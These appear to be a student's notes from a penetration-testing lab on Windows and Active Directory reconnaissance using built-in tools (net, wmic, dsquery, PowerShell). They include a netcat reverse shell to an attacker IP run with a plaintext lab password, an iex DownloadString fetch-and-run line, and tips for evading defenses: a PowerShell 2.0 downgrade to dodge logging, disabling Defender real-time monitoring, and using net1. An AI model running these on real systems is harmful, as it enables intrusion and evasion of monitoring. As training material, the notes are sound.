- If your attackbox/jumphost does not have internet connection and you cannot upload tools.
- Use the binaries that are already present with every 

- `su otheruser` Linux alternative to powershell
```
$Pword = ConvertTo-SecureString "f8gQ8fynP44ek1m3" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("alaading", $Pword)

Start-Process -FilePath "C:\temp\nc.exe" -ArgumentList "-e cmd.exe 10.10.14.183 9090" -Credential $Cred
[OR]
Invoke-Command -ScriptBlock {C:\temp\nc.exe 10.10.14.183 9090 -e cmd.exe} -Credential $Cred -computername localhost
```

## Environment cmds for Host and Network Recon
### Basic Enum Commands:
- `hostname` - print PC name (ex: ACADEMY-MS01)
- `[System.Environment]::OSVersin.Version` 
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` - print patches and hotfixes
- `ipconfig /all` - all network adapters
- `set` - list current sessions env variables
- `echo %USERDOMAIN%` - domain name to which a host belongs to
- `echo %logonserver%` - name of the Domain controller
- `systeminfo` - metadata information

<hr>

## Powershell
### Basic Enumeration:
- `Get-Module` - list loaded modules
- `Get-host` - mention the PS version
- `Get-ExecutionPolicy -List` - print execution policy settings for each scope on a host
- `Set-ExecutionPolicy Bypass -Scope Process` - change policy for current process
- `Get-ChildItem Env: | ft Key,Value` - get env variables in key, value
- `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` - get users Powershell history
- `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` - wget 
<br>
- Multiple Powershell versions are present on one host.
- `PS 3.0 `> logs in `Event Viewer`
- Call `PS 2.0` to skip logging your commands
<br>
**Downgrade Powershell**
- `Get-host` - will mention some `Version: 5.1.x.x` 
- `powershell.exe -version 2`
- `Get-host` - will mention `Version: 2`
- `Get-Module`
- ![](/attachments/Pasted-image-20250212212403.png)
- ![](/attachments/Pasted-image-20250212212547.png)

<hr>

## Checking Defenses
- use the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities

### Check Firewall status 
- `netsh advfirewall show allprofiles` - **PowerShell**
- `sc query windefend` - **cmd.exe** Defender check
- `Get-MpComputerStatus` - **PS** - check status and config settings of Defender
- `Set-MpPreference -DisableRealtimeMonitoring 1​` - disable real-time protection

<hr>

## Other active sessions
- when landing on a host, check if any other user/person is logged in
- `qwinsta`

<hr>

## Networking Information
- `arp -a`: List all known hosts stored in the arp table
- `ipconfig /all` - list all network adapters
- `route print` - display the routing table (IPv4 and IPv6)
- `nets advfirewall show allprofiles` - show host's firewall status

- ![](/attachments/Pasted-image-20250212213453.png)

<hr>

## Windows Management Instrumentation (WMIC)
- scripting engine to retrieve info and run admin tasks on local and remote hosts
- https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4 - WMIC cheat sheet
### Commands:
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` - patch and hotfix info
- `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List`
	- basic host info
- `wmic process list /format:list` - list of processes on host
- `wmic ntdomain list /format:list` - domain and DC info
- `wmic useraccount list /format:list` - list local and domain accounts logged into this device
- `wmic group list /format:list` - local group info
- `wmic sysaccount list /format:list` - list system account info

<hr>

## Net
- https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2
- enum domain information
- `net.exe` monitored by AV

### Net commands:
- `net accounts` - password information
- `net accounts /domain` - password policy
- `net group /domain` - domain group info
- `net group "Domain Admins" /domain` - list users with domain admin privs
- `net group "domain computers" /domain` - list of PCs connected to the domain
- `net group "Domain Controllers" /domain` - list pc accounts of DC
- `net group <domain_group_name> /domain` - list users that belong to group
- `net groups /domain` - list domain groups
- `net localgroup` - all available groups
- `net localgroup administrators /domain` - Info about a group
- `net localgroup Administrators` - list users that belong to the administrators group
- `net localgroup administrators [username] /add` - add user to group
- `net share` - check current shares
- `net user <account_name> /domain` - get info of account in a domain
- `net user /domain` - list all users of the domain
- `net user %username%` - info about current user
- `net use X: \\computer\share` - mount share locally to X:
- `net view` - list of computers
- `net view /all /domain[:domainname]` - shares on a domain
- `net view \computer /ALL` - List shares of a computer
- `net view /domain` - list of PCs of the domain
<br>
- If you think commands from `net` are being logged, use `net1`

<hr>

## Dsquery
- find AD objects
- will exist with the  `Active Directory Domain Services Role` host
- Found at `C:\Windows\System32\dsquery.dll`
- evelated privs or running CMD, PS as `SYSTEM`

### Dsquery DLL
- `dsquery user` - User search
- `dsquery computer` - computer search
- `dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"` - wildcard search 
- `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl` 
	- find `PASSWD_NOTREQD` flag in the `userAccountControl` section
	- combined with LDAP queries
- `dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName`
	- find domain controllers

<hr>

- **LDAP UAC Values**
	- ![](/attachments/Pasted-image-20250212215811.png)
- **LDAP OID Match Strings**
	- https://ldap.com/ldap-oid-reference-guide/
	- OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:
		- `1.2.840.113556.1.4.803`
			- When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.
		- `1.2.840.113556.1.4.804`
			- When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.
		- `1.2.840.113556.1.4.1941`
			- This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

- **Logical Operators**
	- https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax
	- 
